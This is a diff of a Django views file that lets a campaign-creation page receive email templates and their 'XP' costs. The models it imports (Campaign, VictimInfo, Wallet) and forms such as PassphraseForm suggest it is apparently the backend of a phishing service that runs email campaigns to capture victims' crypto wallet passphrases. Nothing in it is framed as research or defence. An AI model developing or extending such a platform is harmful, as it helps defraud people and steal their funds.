@@ -3,7 +3,7 @@ from django.conf import settings
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required
-from .models import Campaign, VictimInfo, Wallet
+from .models import Campaign, VictimInfo, Wallet, EmailTemplate
 from .forms import WalletForm, AddressForm, PassphraseForm, CampaignForm, MultiCampaignForm
 from django.core.mail import send_mail, EmailMultiAlternatives
 from django.template.loader import render_to_string
@@ -34,6 +34,7 @@ def create_campaign(request):
             campaign.user = request.user
             xp_cost = campaign.email_template.xp_cost
 
+
             # Check if user has enough XP to create the campaign
             if request.user.userprofile.xp_balance >= xp_cost:
                 try:
@@ -57,7 +58,16 @@ def create_campaign(request):
                 messages.error(request, 'Insufficient XP balance to create this campaign.')
     else:
         form = CampaignForm()
-    return render(request, 'core/create_campaign.html', {'form': form})
+        
+    user_profile = UserProfile.objects.get(user=request.user)
+    email_templates = EmailTemplate.objects.all()
+    email_templates_data = list(email_templates.values('id', 'type', 'xp_cost'))
+
+    for template in email_templates_data:
+        template['xp_cost'] = float(template['xp_cost'])  # Convert xp_cost to float
+
+    
+    return render(request, 'core/create_campaign.html', {'form': form, 'email_templates': email_templates_data, 'user_profile': user_profile})
 
 
 @login_required
